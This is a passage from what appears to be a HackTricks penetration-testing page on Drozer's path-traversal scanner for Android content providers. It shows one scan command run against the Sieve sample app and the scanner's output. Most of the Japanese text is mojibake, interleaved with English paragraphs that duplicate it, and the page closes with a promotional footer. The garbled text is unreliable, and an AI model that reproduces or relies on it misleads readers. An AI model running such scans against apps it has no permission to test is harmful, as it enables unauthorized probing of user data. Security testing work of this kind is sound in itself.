`path_traversal`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ã¾ãšå¯¾è±¡ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§Drozerã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’é–‹å§‹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒç¢ºç«‹ã•ã‚ŒãŸã‚‰ã€`run`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦`path_traversal`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

The `path_traversal` module will automatically send requests to the target application with different path traversal payloads. If a Path Traversal vulnerability is found, Drozer will display the details of the vulnerability, including the affected endpoint and the payload that triggered the vulnerability.

`path_traversal`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ã€ç•°ãªã‚‹ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å«ã‚€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¯¾è±¡ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è‡ªå‹•çš„ã«é€ä¿¡ã—ã¾ã™ã€‚ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«è„†å¼±æ€§ãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€Drozerã¯è„†å¼±æ€§ã®è©³ç´°ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€å½±éŸ¿ã‚’å—ã‘ã‚‹ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¨è„†å¼±æ€§ã‚’å¼•ãèµ·ã“ã—ãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¾ã™ã€‚

It is important to note that the `path_traversal` module may generate a large number of requests, so it is recommended to use it with caution and only on applications that you have permission to test.

`path_traversal`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ã€å¤§é‡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç”Ÿæˆã™ã‚‹å ´åˆãŒã‚ã‚‹ãŸã‚ã€æ³¨æ„ã—ã¦ä½¿ç”¨ã—ã€ãƒ†ã‚¹ãƒˆã®è¨±å¯ã‚’å¾—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã®ã¿ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’ãŠã™ã™ã‚ã—ã¾ã™ã€‚
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## å‚è€ƒæ–‡çŒ®

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å…¥æ‰‹**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
